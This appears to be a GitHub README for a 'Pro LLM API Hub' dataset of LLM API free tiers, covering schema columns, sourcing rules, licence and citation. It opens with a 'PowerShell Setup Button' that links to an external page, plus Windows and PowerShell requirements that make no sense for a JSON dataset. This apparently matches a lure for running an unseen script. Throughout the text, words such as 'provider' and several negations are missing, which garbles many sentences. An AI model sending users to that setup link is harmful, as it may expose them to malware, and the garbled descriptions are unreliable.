<div align="center">

# Pro LLM API Hub: Structured Multi LLM API Reference — Dataset

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://Ndarrr07.github.io/pro-llm-api-hub/)

[![ps](https://img.shields.io/badge/Ps-Core-dc2626?style=plastic&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/Licence-Apache--2.0-ef4444?style=plastic&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Active-2ea44f?style=plastic&labelColor=0d1117)]() [![language](https://img.shields.io/badge/Language-Python-b91c1c?style=plastic&labelColor=0d1117)]()

</div>

---

This dataset documents the Pro LLM API Hub, a structured compilation of large language model APIs assembled to support systematic comparison and reproducible research. Each record was captured from the 's documentation on a stated date, and every field that could not be independently confirmed is explicitly flagged rather than inferred. Entries are normalized to a common schema, with provenance retained for each claim and any dependency on paid tiers or card verification noted where applicable. The result is a transparent, openly accessible reference that prioritizes verifiability over coverage, so that downstream users can trace every assertion back to its source.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Dataset Structure

The dataset is organized as a flat table of level records, serialized as JSON, with one row per API offering. Each record represents a single 's model-access entry and carries the full set of columns described below. Records are keyed by a stable identifier so that automated re-verification can update a row in place without reordering the file. derived rankings, scores, or curated orderings are stored in the dataset itself; those are computed downstream at build time so that the raw data remains auditable.

Every record includes a fixed schema of fields covering identity, access terms, and provenance. The principal columns are: name and canonical slug; the categories of model access offered (text/LLM, speech, embeddings, image generation, vision, rerank, OCR); the specific models or model families named by the; the stated free allowance (quota, rate limit, token budget, or one-time credit); the conditions attached to that allowance (card requirement, phone verification, commercial-use restriction, evaluation-only status, training-on-inputs policy); an OpenAI-compatibility flag; the sourcing reference to the 's documentation; and a verification date. Where a publishes figures in its words, the relevant phrasing is retained in a dedicated notes field rather than paraphrased, so that downstream consumers can inspect the primary claim.

Fields that could not be confirmed against a primary source are marked as unverified rather than omitted or inferred. This applies in particular to phone-verification requirements and to whether a given allowance is permanent or trial-bound; such entries carry an explicit indicator and are treated as indicative until re-checked. Conflicting or superseded values are not silently overwritten: each row's verification date establishes which reading of the 's documentation was current at the time of capture, and a re-check that longer supports a previously listed allowance results in removal or reclassification rather than retention by default.

The provenance of each row is the 's documentation, cited by document title and the date on which it was read. Where a claim originates from community tracking rather than a primary page, this is recorded in the row itself and reflected in the unverified marker. Verification is performed on a recurring cadence, and the dataset is regenerated from the latest confirmed state; the verification dates on individual rows therefore differ, and consumers should treat the per-row date, not any file-level timestamp, as the authoritative statement of freshness. row is included on the basis of a third-party summary alone when the 's page contradicts or fails to support it.

## Columns

Each record in the dataset is a single, and every field is populated only where the 's documentation supports it. Where a value could not be confirmed, the field is marked as unverified rather than estimated. The table below documents each column, its type, its permitted values, and the sourcing rule applied to it.

| Column | Type | Description | Sourcing rule |
|-|-|-|-|
| `id` | string | Stable slug identifying the (e.g. `groq`, `google-gemini`). Used as the primary key across all derived collections and pages. | Assigned once at entry creation and never reused or reassigned. |
| `name` | string | Display name of the as written in its documentation. | Copied from the 's official site or index. |
| `category` | array of enum | One or more of `text`, `speech`, `embeddings`, `image`, `vision`, `rerank`, `ocr`. A appears in every category for which it publishes a documented endpoint. | Each category requires a corresponding endpoint documented by the. |
| `tier_model` | enum | `renewing` (quota or credit resets on a stated cadence), `one_time` (signup credit consumed once), `permanent` (models listed at $0 indefinitely), or `mixed`. | Taken from the 's pricing or rate-limit page; ambiguous cases are recorded as `mixed` with a note. |
| `signup_requirements` | object | Boolean flags `card_required`, `phone_required`, `account_required`, each with an accompanying `evidence` string quoting or paraphrasing the 's page. | A flag is set to `true` only when the 's page states the requirement; absence of a statement is recorded as `unknown`, not `false`. |
| `commercial_use` | enum | `permitted`, `eval_only`, `restricted`, or `unknown`. | `eval_only` is applied when the 's terms explicitly exclude production or commercial use; `restricted` when conditions apply (e.g. non-compete clauses); `permitted` only when such exclusion appears in the reviewed terms. |
| `openai_compatible` | boolean | Whether the exposes an OpenAI-compatible endpoint, against its API reference. | Set only on documented compatibility; inferred compatibility is not accepted. |
| `free_allowance` | object | Structured description of the cost allowance: `amount`, `unit` (tokens, requests, credits, neurons, calls), `period` (day, month, total), and `models` (list of model identifiers covered). | Values transcribed from the 's pricing or rate-limit table; derived totals are not computed. |
| `rate_limits` | object | Documented requests-per-minute, tokens-per-minute, or equivalent ceilings, with `scope` noting whether the limit applies per key, per organization, or per account. | Recorded verbatim from the 's rate-limit documentation. |
| `training_on_prompts` | enum | ``, `yes`, `opt_out_available`, or `unstated`. Indicates whether the states that inputs may be used for model improvement. | `` requires an explicit statement; silence is recorded as `unstated`. |
| `data_residency` | array of string | Documented hosting or processing regions relevant to data-sovereignty requirements. | Populated only where the names regions explicitly. |
| `source_url_key` | string | Reference key resolving to the 's documentation page within the project's source registry. | Every record must resolve to at least one owned page. |
| `last_` | date (ISO 8601) | Date on which the record's fields were last checked against the 's documentation, in UTC. | Updated only after a full re-read of the cited pages; partial re-checks do not advance the date. |
| `verification_status` | enum | ``, `indicative`, or `stale`. `indicative` marks entries from community tracking and not yet independently re-confirmed. | `` requires at least one maintainer re-check against owned documentation. |
| `notes` | string | Free-text field recording caveats, term changes, or discrepancies between pages on the same 's site. | Used to preserve nuance that does not fit a structured field; not used for interpretation. |

Two conventions apply across all columns. First, absence of evidence is treated as absence of a claim: a field is left `unknown` or `unstated` rather than filled by inference from comparable. Second, structured values are transcribed rather than normalized where normalization would alter meaning — for instance, a stating "50 requests per day, 1,000 after a $10 credit purchase" is recorded as two conditional allowances in `free_allowance` rather than collapsed to a single figure. Records marked `indicative` are retained in the dataset for completeness but are excluded from any aggregate count presented as.

## Source

## Source

The dataset is assembled from publicly available documentation maintained by the API it describes. aggregator, marketplace, or third-party commentary is used as a primary reference; every field is traced to a document the itself publishes and controls.

documentation is the principal class of evidence: pricing pages, rate-limit pages, plan and quota descriptions, terms of service, and model catalogues. Where a documents a single fact across several pages, the most specific page is treated as authoritative and the others are retained as corroboration. Product marketing pages are consulted only for coverage and comparison, never for figures.

For each record, the following are captured: the name and canonical documentation location; the category or categories of API offered; the stated allowance, whether a recurring quota or a one-time credit; any prerequisites such as payment-method verification, identity verification, or account age; the applicable restrictions on use, including commercial and production clauses; and the date on which the documentation was read, recorded in UTC.

Records are classified at three levels of confidence. A record is marked as confirmed when the 's documentation states the fact directly and the page was read on the recorded date. A record is marked as provisional when the fact is implied by documentation but not stated explicitly, or when the relevant page was read on an earlier pass and has not been re-read since. A record is marked as unconfirmed when the supporting statement could not be located on a controlled page; such records are retained only where a 's documentation is known to exist but was inaccessible at the time of reading, and they are excluded from any computed ranking.

All dates are expressed as the date of reading, not the date of publication by the, since documentation pages are frequently revised without a change of address or a visible revision note. Where a supplies its effective date for a term or pricing change, that date is recorded separately alongside the reading date.

Three deliberate exclusions apply. First, figure is inferred from secondary reporting, community discussion, or observed behaviour of an API endpoint. Second, promotional or time-limited communication is used to establish a recurring allowance, even where such communication appears on a controlled page; only the standing documentation for the plan is treated as evidence of an ongoing tier. Third, where a states a rate limit without stating the corresponding allowance, the rate limit is recorded as given and the allowance is left unset rather than derived.

Corrections follow the same standard as initial entries. A record is revised only when a re-reading of the 's documentation longer supports the recorded value, and the revising entry carries its reading date. Superseded values are not deleted silently; they are retained in the change history so that any citation of an earlier state of the dataset can be resolved against the documentation as it stood at that time.

## License

This dataset is distributed under the Creative Commons Attribution 4.0 International license (CC BY 4.0). Under its terms, you may share and adapt the material for any purpose, including commercially, provided you give appropriate attribution, link to the license, and indicate whether changes were made. Attribution should name Pro LLM API Hub as the source and, where practical, reference the dataset version or retrieval date.

The license covers the compilation and the original descriptive fields authored for this dataset — that is, the structured selection, arrangement, and editorial notes produced by the project. It does not extend to third-party material. names, documentation excerpts, pricing figures, and rate-limit details remain the property of their respective and are included here for reference and verification purposes only; their inclusion does not imply any transfer of rights or any endorsement of this dataset by those.

Factual data such as API endpoint names, quota figures, and verification dates are reproduced as observed from documentation at the time of checking. While the project applies a consistent verification method, warranty is made regarding accuracy, completeness, or continued currency, and terms may change without notice. Users are responsible for confirming current terms directly with each before relying on any entry.

If you incorporate this dataset into a derivative work, we ask that you preserve the attribution notice and clearly mark any modifications, so that downstream users can distinguish original entries from altered ones.

## Citation

Researchers using Pro LLM API Hub in derived work should cite the dataset in a form that identifies the specific release consulted, since entries are and revised as terms change. Two citation styles are provided below; either may be adapted to the requirements of the citing venue.

**Plain-text reference**

Pro LLM API Hub. Dataset of LLM and adjacent model APIs, with per-entry verification dates and source attribution. Consult the dataset itself for the release version and date of retrieval, as records are updated continuously.

**BibTeX entry**

```bibtex
@misc{prollmapihub,
title = {Pro LLM API Hub: A Dataset of LLM and Adjacent Model APIs},
author = {{Pro LLM API Hub contributors}},
howpublished = {Dataset},
note = {Version and retrieval date to be supplied by the citing author}
}
```

Because the dataset is revised in place, a citation is only reproducible when it records the version or retrieval date that was actually used. Citing authors are asked to state which of the two they relied upon, and to indicate the access route by which the dataset was obtained (for example, the distributed data file or the interactive explorer) so that a reader can locate the same records.

Attribution should distinguish between the dataset as a curated compilation and the underlying documentation from which individual entries are drawn. The dataset's selection, structuring, and verification metadata may be cited as described above; claims about any 's terms remain attributable to that, and the per-entry source references included in the dataset should be carried forward where such claims are reproduced. Where a derived work reports aggregate figures, the version consulted should be stated alongside them, since counts and classifications are regenerated with each release.

Corrections and suggested amendments to individual records are handled through the project's contribution process rather than through citation; citing authors who identify a discrepancy are encouraged to report it so that subsequent releases reflect the correction.